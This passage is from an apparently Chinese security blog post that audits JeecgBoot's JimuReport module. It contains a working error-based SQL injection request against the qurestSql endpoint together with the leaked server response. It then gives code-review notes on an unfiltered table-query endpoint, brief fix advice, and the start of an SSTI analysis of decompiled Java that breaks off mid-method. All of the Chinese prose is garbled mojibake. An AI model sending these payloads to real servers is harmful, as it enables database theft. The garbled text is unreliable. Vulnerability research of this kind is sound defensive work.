</div><p>åˆ«çš„ä¸œè¥¿å°±ä¸çœ‹äº†ï¼Œå¯ä»¥çŸ¥é“å¾ˆå¤šéƒ½æ²¡è¿‡æ»¤åˆ°äº†ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šè¿™é‡Œå°±æ˜¯æœ‰æ¼æ´çš„äº†ï¼Œæˆ‘ä»¬ç›´æ¥å»æ‰“ä¸€ä¸‹è¯•è¯•ã€‚
<img src="/images/JeecgBoot/6.png"
	
	
	
	loading="lazy"
	
		alt="ç¤ºä¾‹"
	
	
>
æ ¹æ®ç½‘ä¸Šçš„POCæ”»å‡»ä¸€ä¸ªï¼Œå°±å¯ä»¥å‘ç°é¡ºåˆ©æŠ¥é”™å‡ºç»“æœäº†ï¼ŒæŠŠè¯·æ±‚å’Œå›æ˜¾éƒ½æ”¾ä¸‹æ¥ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">å…³é”®è¯·æ±‚å¤´ï¼š
</span></span><span class="line"><span class="cl">POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
</span></span><span class="line"><span class="cl">Content-Type: application/json; charset=utf-8
</span></span><span class="line"><span class="cl">{&#34;apiSelectId&#34;:&#34;1316997232402231298&#34;,&#34;id&#34;:&#34;1&#39; or &#39;%1%&#39; like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or &#39;%%&#39; like &#39;&#34;}
</span></span><span class="line"><span class="cl">å›æ˜¾ï¼š
</span></span><span class="line"><span class="cl">&#34;æ“ä½œå¤±è´¥ï¼ŒPreparedStatementCallback; uncategorized SQLException for SQL [select * from rep_demo_employee where id=&#39;1&#39; or &#39;%1%&#39; liâ€¦9ba59abbe56e057f20f883e&#39;; nested exception is java.sql.SQLException: XPATH syntax error: &#39;e10adc3949ba59abbe56e057f20f883e&#39;&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾ˆæ˜æ˜¾æˆåŠŸæ”»å‡»äº†ï¼Œåé¢æ…¢æ…¢æ‰“å°±è¡Œäº†ã€‚</p>
<h2 id="ä¿®å¤å»ºè®®-3">ä¿®å¤å»ºè®®
</h2><p>åŠæ—¶æ›´æ–°é»‘åå•çš„è¿‡æ»¤ï¼Œé¿å…è¢«æ”»å‡»ï¼Œä»¥åŠå¯¹æ¶æ„ç¬¦å·çš„è¿‡æ»¤ï¼Œæ¯”å¦‚&rsquo;å’Œ&quot;ç­‰ç­‰ã€‚ç¼ºå°‘è¿‡æ»¤æ˜“è¢«æ”»å‡»æ‹¿åˆ°æ•°æ®åº“ã€‚</p>
<h2 id="getdictitemsbytableæ¥å£">getDictItemsByTableæ¥å£
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//    @RequestMapping(value = &#34;/getDictItemsByTable/{table}/{key}/{value}&#34;, method = RequestMethod.GET)  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//    public Object getDictItemsByTable(@PathVariable String table,@PathVariable String key,@PathVariable String value) {  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//        return this.ngAlainService.getDictByTable(table,key,value);  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//    }  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¾ˆæ˜æ˜¾å•Šï¼Œåˆç»™å¥¹æ³¨é‡Šæ‰äº†ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æ˜¯ä»€ä¹ˆæ¯›ç—…ã€‚ç®€å•å®¡è®¡ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œæ˜¯æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„æ‹¼æ¥æŸ¥è¯¢ã€‚æ²¡æœ‰æƒé™çš„åˆ¤æ–­ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ç›´æ¥è¿›è¡Œè®¿é—®ã€‚ä»è€Œè¿›è¡Œåˆ©ç”¨ã€‚å¯ä»¥æŸ¥è¯¢åˆ°å¾ˆå¤šä¸œè¥¿ã€‚ä½†æ˜¯å¾ˆæ˜æ˜¾è¿™é‡Œå·²ç»å»æ‰äº†ï¼Œå°±ä¸å°è¯•æ”»å‡»è¿™ä¸ªäº†ã€‚</p>
<h2 id="ä¿®å¤å»ºè®®-4">ä¿®å¤å»ºè®®
</h2><p>å¯¹åªéœ€è®¾ç½®å‚æ•°çš„æŸ¥è¯¢åšå¥½é¢„ç¼–è¯‘ä»¥åŠå‚æ•°çš„è¿‡æ»¤ç­‰ç­‰ã€‚å°½å¯èƒ½é¿å…è¢«SQLæ³¨å…¥æ”»å‡»åˆ°ã€‚</p>
<h1 id="sstiæ¼æ´">SSTIæ¼æ´
</h1><p>Javaé‡Œé¢çš„SSTIæ¼æ´ï¼Œå­¦ä¹ ï¼</p>
<h2 id="loadtabledataæ–¹æ³•">loadTableDataæ–¹æ³•
</h2><p>æ‰¾äº†ä¸€ä¸‡å¹´ï¼Œè‰¹äº†ã€‚ç›´æ¥çœ‹ä¸‹é¢çš„ä»£ç å§ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">loadTableData</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">dbKey</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">tableName</span><span class="p">,</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">pageNo</span><span class="p">,</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">pageSize</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">sql</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">paramArray</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">HashMap</span><span class="w"> </span><span class="n">var7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">(</span><span class="n">5</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">var8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">jimuTokenClient</span><span class="p">.</span><span class="na">getToken</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Map</span><span class="w"> </span><span class="n">var9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">g</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">var8</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">jimuTokenClient</span><span class="p">.</span><span class="na">getUserInfo</span><span class="p">(</span><span class="n">var8</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">g</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">paramArray</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">a</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span><span class="w"> </span><span class="n">var9</span><span class="p">,</span><span class="w"> </span><span class="n">JSONArray</span><span class="p">.</span><span class="na">parseArray</span><span class="p">(</span><span class="n">paramArray</span><span class="p">));</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">a</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span><span class="w"> </span><span class="n">var9</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">JSONArray</span><span class="p">)</span><span class="kc">null</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">a</span><span class="p">.</span><span class="na">debug</span><span class="p">(</span><span class="s">&#34;æŠ¥è¡¨æŸ¥è¯¢querySql=&gt;\r\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sql</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">var10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">e</span><span class="p">(</span><span class="n">sql</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">g</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">var10</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">List</span><span class="w"> </span><span class="n">var11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">jmreportDynamicDbUtil</span><span class="p">.</span><span class="na">a</span><span class="p">(</span><span class="n">dbKey</span><span class="p">,</span><span class="w"> </span><span class="n">var10</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var7</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;records&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">b</span><span class="p">(</span><span class="n">var11</span><span class="p">));</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">jmreportNoSqlUtil</span><span class="p">.</span><span class="na">b</span><span class="p">(</span><span class="n">dbKey</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">List</span><span class="w"> </span><span class="n">var15</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">jmreportNoSqlUtil</span><span class="p">.</span><span class="na">a</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span><span class="w"> </span><span class="n">dbKey</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var7</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;records&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">b</span><span class="p">(</span><span class="n">var15</span><span class="p">));</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">g</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">dbKey</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">a</span><span class="w"> </span><span class="n">var16</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">org</span><span class="p">.</span><span class="na">jeecg</span><span class="p">.</span><span class="na">modules</span><span class="p">.</span><span class="na">jmreport</span><span class="p">.</span><span class="na">dyndb</span><span class="p">.</span><span class="na">a</span><span class="p">.</span><span class="na">a</span><span class="p">(</span><span class="n">dbKey</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">var12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MiniDaoUtil</span><span class="p">.</span><span class="na">createPageSql</span><span class="p">(</span><span class="n">var16</span><span class="p">.</span><span class="na">getDbUrl</span><span class="p">(),</span><span class="w"> </span><span class="n">sql</span><span class="p">,</span><span class="w"> </span><span class="n">pageNo</span><span class="p">,</span><span class="w"> </span><span class="n">pageSize</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">a</span><span class="p">.</span><span class="na">debug</span><span class="p">(</span><span class="s">&#34;æŠ¥è¡¨æŸ¥è¯¢pageSQL=&gt;\r\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">var12</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">List</span><span class="w"> </span><span class="n">var13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">jmreportDynamicDbUtil</span><span class="p">.</span><span class="na">b</span><span class="p">(</span><span class="n">dbKey</span><span class="p">,</span><span class="w"> </span><span class="n">var12</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var7</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;records&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">b</span><span class="p">(</span><span class="n">var13</span><span class="p">));</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">MiniDaoPage</span><span class="w"> </span><span class="n">var17</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">reportDbDao</span><span class="p">.</span><span class="na">selectPageBySql</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span><span class="w"> </span><span class="n">pageNo</span><span class="p">,</span><span class="w"> </span><span class="n">pageSize</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var7</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;total&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var17</span><span class="p">.</span><span class="na">getTotal</span><span class="p">());</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var7</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;records&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">b</span><span class="p">(</span><span class="n">var17</span><span class="p">.</span><span class="na">getResults</span><span class="p">()));</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">var7</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸ªæ–¹æ³•ï¼Œä¸€çœ¼çœ‹ä¸Šå»ï¼Œæœ‰ç‚¹åƒSQLæŸ¥è¯¢å•Šï¼Œæœ¬æ¥çœ‹çœ‹æœ‰æ²¡æœ‰SQLæ³¨å…¥æ¼æ´çš„ï¼Œç»“æœçœ‹åˆ°é‡Œé¢æœ‰ä¸€ä¸ªæ¸²æŸ“ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">a</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span><span class="w"> </span><span class="n">var9</span><span class="p">,</span><span class="w"> </span><span class="n">JSONArray</span><span class="p">.</span><span class="na">parseArray</span><span class="p">(</span><span class="n">paramArray</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">å’Œ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">a</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span><span class="w"> </span><span class="n">var9</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">JSONArray</span><span class="p">)</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæœ‰ä»€ä¹ˆæ¼æ´å—ï¼Œæˆ‘ä»¬å°±è¦å»æ‰¾è¿™é‡Œçš„eç±»çš„aæ–¹æ³•äº†ã€‚ç›´æ¥è¿‡å»çœ‹çœ‹ã€‚æ‰¾åˆ°æ–‡ä»¶å¤¹ä¸‹çš„eç±»ï¼Œæ‰¾æ‰¾aæ–¹æ³•ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">a</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">var0</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">var1</span><span class="p">,</span><span class="w"> </span><span class="n">JSONArray</span><span class="w"> </span><span class="n">var2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">var0</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="s">&#34;&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">var0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">var0</span><span class="p">.</span><span class="na">endsWith</span><span class="p">(</span><span class="s">&#34;;&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var0</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">var0</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">i</span><span class="p">.</span><span class="na">a</span><span class="p">(</span><span class="n">var0</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="p">(</span><span class="n">var0</span><span class="p">,</span><span class="w"> </span><span class="n">var1</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="p">(</span><span class="n">var2</span><span class="p">,</span><span class="w"> </span><span class="n">var0</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="p">(</span><span class="n">var0</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;\\$&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">var0</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JimuReportException</span><span class="p">(</span><span class="s">&#34;sqlä¸ºç©º&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°å•Šï¼Œè¿™é‡Œçš„ä»£ç åªæ˜¯ä¸€ä¸ªä¸­è½¬ï¼Œå†å¾€åé¢æ‰¾ï¼Œè¿™é‡Œå¯ä»¥æ‰¾åˆ°è¿™é‡Œçš„å¦ä¸€ä¸ªaæ–¹æ³•ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">a</span><span class="p">(</span><span class="n">JSONArray</span><span class="w"> </span><span class="n">var0</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">HashMap</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">(</span><span class="n">5</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;\\$\\{(\\S+)\\}&#34;</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Pattern</span><span class="w"> </span><span class="n">var4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Pattern</span><span class="p">.</span><span class="na">compile</span><span class="p">(</span><span class="n">var3</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Matcher</span><span class="w"> </span><span class="n">var5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var4</span><span class="p">.</span><span class="na">matcher</span><span class="p">(</span><span class="n">var1</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="n">var5</span><span class="p">.</span><span class="na">find</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">var6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var5</span><span class="p">.</span><span class="na">group</span><span class="p">().</span><span class="na">replace</span><span class="p">(</span><span class="s">&#34;${&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">).</span><span class="na">replace</span><span class="p">(</span><span class="s">&#34;}&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">var6</span><span class="p">,</span><span class="w"> </span><span class="n">var5</span><span class="p">.</span><span class="na">group</span><span class="p">());</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="kc">null</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">var0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">var0</span><span class="p">.</span><span class="na">size</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">var13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">var13</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">var0</span><span class="p">.</span><span class="na">size</span><span class="p">();</span><span class="w"> </span><span class="o">++</span><span class="n">var13</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
